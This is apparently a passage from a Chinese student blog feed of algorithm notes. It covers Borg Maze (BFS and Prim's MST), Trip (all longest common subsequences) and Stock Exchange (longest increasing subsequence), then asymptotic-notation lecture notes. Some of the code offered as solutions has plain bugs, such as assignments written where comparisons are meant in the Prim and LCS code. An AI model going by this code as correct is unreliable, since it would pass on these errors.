class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(visit[i]==<span class="literal">false</span>&amp;&amp;dis[i]&gt;d[v][i])</span><br><span class="line">        dis[i] = d[v][i];</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i,j,k;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n)!=EOF)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memset</span>(visit,<span class="literal">false</span>,<span class="built_in">sizeof</span>(visit));</span><br><span class="line">        ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;n;j++)</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;d[i][j]);</span><br><span class="line">        <span class="built_in">prim</span>();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="12-Brog-Maze"><a href="#12-Brog-Maze" class="headerlink" title="12.Brog Maze"></a>12.Brog Maze</h3><p><strong>Description</strong></p>
<p>The Borg is an immensely powerful race of enhanced humanoids from the delta quadrant of the galaxy. The Borg collective is the term used to describe the group consciousness of the Borg civilization. Each Borg individual is linked to the collective by a sophisticated subspace network that insures each member is given constant supervision and guidance.</p>
<p>Your task is to help the Borg (yes, really) by developing a program which helps the Borg to estimate the minimal cost of scanning a maze for the assimilation of aliens hiding in the maze, by moving in north, west, east, and south steps. The tricky thing is that the beginning of the search is conducted by a large group of over 100 individuals. Whenever an alien is assimilated, or at the beginning of the search, the group may split in two or more groups (but their consciousness is still collective.). The cost of searching a maze is definied as the total distance covered by all the groups involved in the search together. That is, if the original group walks five steps, then splits into two groups each walking three steps, the total distance is 11=5+3+3.</p>
<p><strong>Input</strong></p>
<p>On the first line of input there is one integer, N &lt;= 50, giving the number of test cases in the input. Each test case starts with a line containg two integers x, y such that 1 &lt;= x,y &lt;= 50. After this, y lines follow, each which x characters. For each character, a space <code>&#39;&#39; stands for an open space, a hash mark</code>#’’ stands for an obstructing wall, the capital letter <code>A&#39;&#39; stand for an alien, and the capital letter</code>S’’ stands for the start of the search. The perimeter of the maze is always closed, i.e., there is no way to get out from the coordinate of the ``S’’. At most 100 aliens are present in the maze, and everyone is reachable.</p>
<p><strong>Output</strong></p>
<p>For every test case, output one line containing the minimal cost of a succesful search of the maze leaving no aliens alive.</p>
<p>分析：简单翻译了一下，本题的任务使帮助Brog人开发一个程序，来帮助Brog人估计扫描迷宫的最低成本，以吸收隐藏在迷宫中的外星人，通过向北、向南和向东向西的步骤进行。首先，第一个输入是一个integer N&lt;=50,来标记测试数据集的种类。每一个测试集首先给出两个整数x，y，$1\le x,y \le 50$。再这之后存在y行，每一行有x个种类，’A’表示外星人，’#’表示一个墙，‘S’表示开始的位置。我们要成功的找到每一个外形人并使路数最少。</p>
<p>这个题显然是来找从S开始的一个最小的生成树，但是这里应该用什么数据结构来存储maze是一个问题。在使用最小生成树之前，首先应该算出各个点(包含S点和A点之间的距离)，这里可以使用BFS算法来进行解决。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">#include&lt;queue&gt;</span><br><span class="line">#include&lt;map&gt;</span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">char g[100][100];</span><br><span class="line">int n,m;</span><br><span class="line">int a[100][100];</span><br><span class="line">int Move[][2] = &#123;&#123;1,0&#125;,&#123;-1,0&#125;,&#123;0,1&#125;,&#123;0,-1&#125;&#125;;</span><br><span class="line">//这四个表示坐标方向，例如1，0表示向右走一步，-1，0表示向左走一步</span><br><span class="line"></span><br><span class="line">int cost[100][100];</span><br><span class="line">int t[100][100];</span><br><span class="line">void Bfs(int sx,int sy)&#123;</span><br><span class="line">    queue&lt;pair&lt;int,int&gt; &gt;q;</span><br><span class="line">    //设置一个队列q</span><br><span class="line">    while (!q.empty()) &#123;</span><br><span class="line">        q.pop();</span><br><span class="line">    &#125;</span><br><span class="line">    //如果队列不空，就出队</span><br><span class="line">    memset(t,-1,sizeof(t));</span><br><span class="line">    t[sx][sy] = 0;</span><br><span class="line">    q.push(make_pair(sx,sy));</span><br><span class="line">    while(!q.empty())&#123;</span><br><span class="line">        pair&lt;int,int&gt; now=q.front();</span><br><span class="line">        q.pop();</span><br><span class="line">        if(a[now.first][now.second]!=-1)</span><br><span class="line">        cost[a[sx][sy]][a[now.first][now.second]]=t[now.first][now.second];</span><br><span class="line">        for(int i=0;i&lt;4;i++)&#123;</span><br><span class="line">            int tx=now.first+Move[i][0];</span><br><span class="line">            int ty=now.second+Move[i][1];</span><br><span class="line">            if(g[tx][ty]==&#x27;#&#x27;||t[tx][ty]!=-1)continue;</span><br><span class="line">            t[tx][ty]=t[now.first][now.second]+1;</span><br><span class="line">            q.push(make_pair(tx,ty));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">const int INF=0x3f3f3f3f;</span><br><span class="line">bool visit[110];</span><br><span class="line">int lowc[110];</span><br><span class="line">int Prim(int n)&#123;</span><br><span class="line">    int ans=0;</span><br><span class="line">    memset(visit,false,sizeof(visit));</span><br><span class="line">    visit[0]=true;</span><br><span class="line">    for(int i=1;i&lt;n;i++)lowc[i]=cost[0][i];</span><br><span class="line">    for(int i=1;i&lt;n;i++)&#123;</span><br><span class="line">        int minc=INF;int p=-1;</span><br><span class="line">        for(int j=0;j&lt;n;j++)&#123;</span><br><span class="line">            if(!visit[j]&amp;&amp;minc&gt;lowc[j])&#123;</span><br><span class="line">                minc=lowc[j];</span><br><span class="line">                p=j;</span><br><span class="line">            &#125; </span><br><span class="line">        &#125;</span><br><span class="line">        if(minc=INF)return -1;</span><br><span class="line">        ans +=minc;</span><br><span class="line">        visit[p]=true;</span><br><span class="line">        for(int j=0;j&lt;n;j++)</span><br><span class="line">            if(!visit[j]&amp;&amp;lowc[j]&gt;cost[p][j])</span><br><span class="line">            lowc[j]=cost[p][j];</span><br><span class="line">    &#125;</span><br><span class="line">    return ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    int T;</span><br><span class="line">    scanf(&quot;%d&quot;,&amp;T);</span><br><span class="line">    while(T--)</span><br><span class="line">    &#123;</span><br><span class="line">        scanf(&quot;%d%d&quot;,&amp;m,&amp;n);</span><br><span class="line">        gets(g[0]);</span><br><span class="line">        memset(a,-1,sizeof(a));</span><br><span class="line">        int tol=0;</span><br><span class="line">        for(int i=0;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            gets(g[i]);</span><br><span class="line">            for(int j=0;j&lt;m;j++)</span><br><span class="line">                if(g[i][j]==&#x27;A&#x27;||g[i][j]==&#x27;S&#x27;)</span><br><span class="line">                    a[i][j]=tol++;</span><br><span class="line">        &#125;</span><br><span class="line">        for(int i=0;i&lt;n;i++)</span><br><span class="line">            for(int j=0;j&lt;n;j++)</span><br><span class="line">                if(a[i][j]!=-1)</span><br><span class="line">                    Bfs(i,j);</span><br><span class="line">        printf(&quot;%d\n&quot;,Prim(tol));</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="13-Trip"><a href="#13-Trip" class="headerlink" title="13.Trip"></a>13.Trip</h3><p><strong>Description</strong></p>
<p>Alice and Bob want to go on holiday. Each of them has planned a route, which is a list of cities to be visited in a given order. A route may contain a city more than once.<br>As they want to travel together, they have to agree on a common route. None wants to change the order of the cities on his or her route or add other cities. Therefore they have no choice but to remove some cities from the route. Of course the common route should be as long as possible.<br>There are exactly 26 cities in the region. Therefore they are encoded on the lists as lower case letters from ‘a’ to ‘z’.</p>
<p><strong>Input</strong></p>
<p>The input consists of two lines; the first line is Alice’s list, the second line is Bob’s list.<br>Each list consists of 1 to 80 lower case letters with no spaces inbetween.</p>
<p><strong>Output</strong></p>
<p>The output should contain all routes that meet the conditions described above, but no route should be listed more than once. Each route should be printed on a separate line. There is at least one such non-empty route, but never more than 1000 different ones. Output them in ascending order.</p>
<p>分析：Alice和Bob想要去度假，每个人都规划好了一条路径，这个代表访问城市的列表，一条线路上的每一个城市可能不止访问了一次，我们要使他们的公共路径尽可能的长，这里用英文字母来表示城市的序列。这显然是一个longest common subsequence的问题，也就是LCS，我们可以使用动态DP算法来解决这个问题，这个问题比较棘手的一点是要输出所有的公共最长子序列，因此需要以某种方式从后向前进行回溯运算。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> alice[<span class="number">100</span>],bob[<span class="number">100</span>],tmp[<span class="number">100</span>];</span><br><span class="line"><span class="type">int</span> dp[<span class="number">100</span>][<span class="number">100</span>],pos1[<span class="number">100</span>][<span class="number">100</span>],pos2[<span class="number">100</span>][<span class="number">100</span>];</span><br><span class="line"><span class="comment">//set&lt;string&gt; ans;</span></span><br><span class="line"><span class="type">int</span> lena,lenb;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ans</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="built_in">string</span> str;</span><br><span class="line">&#125;ans[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">LCS</span><span class="params">(<span class="type">int</span> len1,<span class="type">int</span> len2,<span class="type">int</span> len)</span>&#123;</span><br><span class="line">    <span class="comment">//没有公共子序列</span></span><br><span class="line">    <span class="keyword">if</span>(len&lt;=<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">string</span> str;</span><br><span class="line">        str = tmp+<span class="number">1</span>;</span><br><span class="line">        ans[cnt++].str=str;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(len1&gt;<span class="number">0</span>&amp;&amp;len2&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">26</span>;i++)&#123;</span><br><span class="line">            <span class="type">int</span> p1 = pos1[len1][i];</span><br><span class="line">            <span class="type">int</span> p2 = pos2[len2][i];</span><br><span class="line">            <span class="comment">//递归的进行运算</span></span><br><span class="line">            <span class="keyword">if</span>(dp[p1][p2] == len)&#123;</span><br><span class="line">                tmp[len] =  i +<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">                LCS(p1<span class="number">-1</span>,p2<span class="number">-1</span>,len<span class="number">-1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">&quot;%s%s&quot;</span>,alice+<span class="number">1</span>,bob+<span class="number">1</span>)!=EOF)&#123;</span><br><span class="line">        <span class="comment">//将一直将字符串读完，但是第一个字符是一个无效的字符</span></span><br><span class="line">        lena =  <span class="built_in">strlen</span>(alice+<span class="number">1</span>);</span><br><span class="line">        lenb = <span class="built_in">strlen</span>(bob+<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;=lena;i++)&#123;</span><br><span class="line">            dp[i][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;=lenb;j++)&#123;</span><br><span class="line">            dp[<span class="number">0</span>][j] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//初始化DP矩阵</span></span><br><span class="line">        <span class="type">int</span> tmpi =<span class="number">-1</span>,tmpj=<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=lena;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=lenb;j++)&#123;</span><br><span class="line">                dp[i][j] = max(dp[i][j],dp[i<span class="number">-1</span>][j]);</span><br><span class="line">                dp[i][j] = max(dp[i][j],dp[i][j<span class="number">-1</span>]);</span><br><span class="line">                <span class="keyword">if</span>(alice[i]=bob[i])&#123;</span><br><span class="line">                    dp[i][j] = dp[i<span class="number">-1</span>][j<span class="number">-1</span>]+<span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//dp矩阵中的两种情况</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//解决子问题，计算最长子序列长度，但是子序列存在多种情况</span></span><br><span class="line">        <span class="built_in">memset</span>(pos1,<span class="number">-1</span>,<span class="keyword">sizeof</span> pos1);</span><br><span class="line">        <span class="built_in">memset</span>(pos2,<span class="number">-1</span>,<span class="keyword">sizeof</span> pos2);</span><br><span class="line">        <span class="comment">//将pos1和pos2都设置为-1</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=lena;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;<span class="number">26</span>;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(alice[i]==j+<span class="string">&#x27;a&#x27;</span>)&#123;</span><br><span class="line">                    pos1[i][j] = i;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    pos1[i][j]=pos1[i<span class="number">-1</span>][j];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=lenb;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;<span class="number">26</span>;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(bob[i]==j+<span class="string">&#x27;a&#x27;</span>)&#123;</span><br><span class="line">                    pos2[i][j] = i;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    pos2[i][j]=pos1[i<span class="number">-1</span>][j];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//这两段代码是找到每个字母最后出现的位置</span></span><br><span class="line">        <span class="built_in">memset</span>(tmp,<span class="number">0</span>,<span class="keyword">sizeof</span>(tmp));</span><br><span class="line">        LCS(lena,lenb,dp[lena][lenb]);</span><br><span class="line">        <span class="built_in">set</span>&lt;<span class="built_in">string</span>&gt;::iterator iter;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;cnt;i++)&#123;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;ans[i].str&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// for(iter = ans.begin();iter != ans.end();iter++)&#123;</span></span><br><span class="line">        <span class="comment">//         cout&lt;&lt;*iter&lt;&lt;endl;</span></span><br><span class="line">        <span class="comment">//     &#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="14-Stock-Exchange"><a href="#14-Stock-Exchange" class="headerlink" title="14.Stock Exchange"></a>14.Stock Exchange</h3><p><strong>Description</strong></p>
<p>The world financial crisis is quite a subject. Some people are more relaxed while others are quite anxious. John is one of them. He is very concerned about the evolution of the stock exchange. He follows stock prices every day looking for rising trends. Given a sequence of numbers p1, p2,…,pn representing stock prices, a rising trend is a subsequence pi1 &lt; pi2 &lt; … &lt; pik, with i1 &lt; i2 &lt; … &lt; ik. John’s problem is to find very quickly the longest rising trend.</p>
<p><strong>Input</strong></p>
<p>Each data set in the file stands for a particular set of stock prices. A data set starts with the length L (L ≤ 100000) of the sequence of numbers, followed by the numbers (a number fits a long integer).<br>White spaces can occur freely in the input. The input data are correct and terminate with an end of file.</p>
<p><strong>Output</strong></p>
<p>The program prints the length of the longest rising trend.<br>For each set of data the program prints the result to the standard output from the beginning of a line.</p>
<p>分析：John对股票交换十分感兴趣，他每天都在关系股价之间的涨跌。其实这个就是给定一定长度的数据输入，来根据输入找到一个最长的升序子序列。这个问题可以使用DP算法来解决,定义dp[i]为以a[i]结尾了最长升序子序列的长度，dp[i]=max{1,dp[i-1]+1},当a[i]&gt;a[j].</p>
<p>初始的DP但是出现了out time 的错误，这个算法的时间复杂度是O($n^2$),看来要进一步改进</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> L[<span class="number">100005</span>];</span><br><span class="line"><span class="type">int</span> dp[<span class="number">100005</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> N;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;N)&amp;&amp;N)&#123;</span><br><span class="line">        <span class="type">int</span> ans =  <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;N;i++)&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;L[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;N;i++)&#123;</span><br><span class="line">        dp[i] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;i;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(L[i]&gt;L[j])</span><br><span class="line">            dp[i]=max(dp[i],dp[j]+<span class="number">1</span>);</span><br><span class="line">        ans = max(ans,dp[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​    这里可以将DP数组中存储的值进行改变，之前dp[i]代表的是升序子序列的长度，这里我们将dp[i]来表示所有长度为i的上升子序列中，结尾最小的那个序列的结尾数字。这个的原理是，如果数字一直变小那么就一定不是升序序列，因此就不断的更新dp[i]的值，如果遇到了递增的值，则存在递增的序列就向后移动一个，并将结尾的数字存进去。这样等于我们记录了每一个长度的序列最后一个小值。递推式为dp[i+1]=min(dp[i+1],L[i+1]),当然这里还需要和前面的数进行比较，这里使用二分查找就可以。这样就可以得到O($n\log n$)的算法。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> dp[<span class="number">100005</span>];</span><br><span class="line"><span class="type">int</span> L[<span class="number">100005</span>];</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INF 0x3f3f3f3f</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> min(a,b) (a &lt; b ? a:b)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="type">int</span> pos;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n)!=EOF)</span><br><span class="line">    &#123;   </span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;L[i]);</span><br><span class="line">        <span class="comment">//初始化数组</span></span><br><span class="line">        <span class="built_in">memset</span>(dp,INF,<span class="built_in">sizeof</span>(dp));</span><br><span class="line">        <span class="comment">//fill(dp,dp+n,INF);</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;n;j++)&#123;</span><br><span class="line">        <span class="comment">//使用lowerbound内置函数，能够二分查找第一个给定值的指针位置</span></span><br><span class="line">        *<span class="built_in">lower_bound</span>(dp,dp+n,L[j]) = L[j]; </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="built_in">lower_bound</span>(dp,dp+n,INF)-dp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>解答情况如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221219210519243.png" alt="image-20221219210519243"></p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>Divide and Conquer</tag>
        <tag>Sort</tag>
      </tags>
  </entry>
  <entry>
    <title>Design and Analysis of Algorithms2</title>
    <url>/2023/01/11/algorithm2/</url>
    <content><![CDATA[<h1 id="leture2"><a href="#leture2" class="headerlink" title="leture2"></a>leture2</h1><h3 id="1-Notions-of-Algorithm-and-Time-Complexity"><a href="#1-Notions-of-Algorithm-and-Time-Complexity" class="headerlink" title="1.Notions of Algorithm and Time Complexity"></a>1.Notions of Algorithm and Time Complexity</h3><p>An assignment of parameters -&gt; an instance（实例） of problem</p>
<p>Algorithm A for problem P:</p>
<p>1.选择任何P的实例作为A的输入，计算每一步的结果都是确定的</p>
<p>2.A   在有限步停止(halt)</p>
<p>3.总是输出正确的解</p>
<p>An insightful(有深刻了解的) analysis is based on the right simplifications（简化）.</p>
<p>基础的运算步骤（原子操作）：compare,add,multiplication,swap,assign</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230111105652737.png" alt="image-20230111105652737"></p>
<p>Average-case:</p>
<p>Formular of A(n)</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230111110117514.png" alt="image-20230111110117514"></p>
<p>这里的计算也就是没一种instance出现的概率乘复杂度，这里在很多情况下我们这里假设输入是均匀分布的.</p>
<p>下面是一种顺序检索问题的复杂度计算实例，这里对于存在数组中的元素，要比较相应的index次，而不在数组中的元素，要整个检索数组以后才能发现.最坏情况下也就是n次平均情况下可以由下面的公式计算，其中x在数组中的情况还要看数的分布概率.</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230111110914883.png" alt="image-20230111110914883"></p>
<h3 id="2-Pseudocode-of-Algorithm"><a href="#2-Pseudocode-of-Algorithm" class="headerlink" title="2.Pseudocode of Algorithm"></a>2.Pseudocode of Algorithm</h3><p>伪代码是算法运算原则的一种非正式的高级描述，下面是一些常见的convention</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230111111234426.png" alt="image-20230111111234426"></p>
<h3 id="3-Asymptotic-Order-of-Function"><a href="#3-Asymptotic-Order-of-Function" class="headerlink" title="3.Asymptotic Order of Function"></a>3.Asymptotic Order of Function</h3><p>函数的渐进阶</p>
<p>1.<strong>Big-O Notation</strong></p>
<p>​    g是f的渐进上界</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230111111641953.png" alt="image-20230111111641953"></p>
<p>大O符号用函数的增长率来描述函数：拥有相同增长率的不同函数可能使用相同的大O符号来描述.</p>
<ul>
<li>letter O is used because the growth rate of a function is also referred to as the order of the function.</li>
<li>there are many (c, n0), it suffices(足够) to find one tuple </li>
<li>for finite values n ≤ n0, the inequality(不等性) may not hold </li>
<li>constance(恒定常数) functions can be written as O(1)</li>
</ul>
<p>2.<strong>Big Omega Notation</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230111112746803.png" alt="image-20230111112746803"></p>
<p>$f(n) = Ω(g(n))$: the order of $f(n)$ is greater than $g(n)$.</p>
<p>也就是通过这个符号给出一个复杂度的下界</p>
<p>3.<strong>Small O Notation</strong></p>
<p>上面的O符号和$\Omega$符号给出的可能是loose上界和下界，下面使用下面两个符号给出更tight的界</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230111113548789.png" alt="image-20230111113548789"></p>
<p>$f(n) = o(g(n))$: the order of $f(n)$ is strictly smaller than that of $g(n)$ Typical usage. $log n = o(n)$</p>
<p>4.<strong>Small omega Notation</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230111113754558.png" alt="image-20230111113754558"></p>
<p>$f(n) = ω(g(n))$: the order of $f(n)$ is strictly larger than that of $g(n)$ Typical usage.$n = ω(log n)$</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230111113919249.png" alt="image-20230111113919249"></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230111113952920.png" alt="image-20230111113952920"></p>
<p>5.<strong>Big Theta Notation: Aims to a Tight Bound</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230111114035412.png" alt="image-20230111114035412"></p>
<p>Proof. Definition of the limit ⇒ $∀ε &gt; 0, ∃n0, ∀n ≥ n0: $</p>
<p>$|f(n)/g(n) − c| &lt; ε $</p>
<p>$c − ε &lt; f(n)/g(n) &lt; c + ε$</p>
<p>choose $ε = c/2 ⇒ c/2 &lt; f(n)/g(n) &lt; 3c/2$</p>
<p>$ ∀n ≥ n0, f(n) ≤ (3c/2)g(n) ⇒ f(n) = O(g(n))$</p>
<p>$ ∀n ≥ n0, f(n) ≥ (c/2)g(n) ⇒ f(n) = Ω(g(n))$</p>
<p>$f(n) = Θ(g(n)): f(n) = O(g(n)) ∧ f(n) = Ω(g(n))$, $f(n)$ and $g(n)$ have the same order Typical usage: Mergesort makes $Θ(n log n)$ compares to sort n elements.</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230111115823914.png" alt="image-20230111115823914"></p>
<p>上面是试除法看数是不是素数，这里当然复杂度和因子有关</p>
<p>下面是是大O带有多变量的情况</p>
<p>Upper bounds. $f(m, n)$ is $O(g(m, n)) $if$ ∃c &gt; 0, m_0 ≥ 0 $and $n_0 ≥ 0$ such that $∀n ≥ n_0$ and $m ≥ m_0, f(m, n) ≤ c · g(m, n)$</p>
<p>性质1：</p>
<ul>
<li>$f = O(g) ∧ g = O(h) ⇒ f = O(h)$</li>
<li>$ f = Ω(g) ∧ g = Ω(h) ⇒ f = Ω(h)$</li>
<li>$ f = Θ(g) ∧ g = Θ(h) ⇒ f = Θ(h)$</li>
<li>$ f = o(g) ∧ g = o(h) ⇒ f = o(h)$</li>
<li>$ f = ω(g) ∧ g = ω(h) ⇒ f = ω(h)$</li>
</ul>
<p>性质2：</p>
<ul>
<li>$f1 = O(g_1) ∧ f_2 = O(g_2) ⇒ f_1f_2 = O(g_1g_2)$</li>
<li>$f · O(g) = O(fg)$</li>
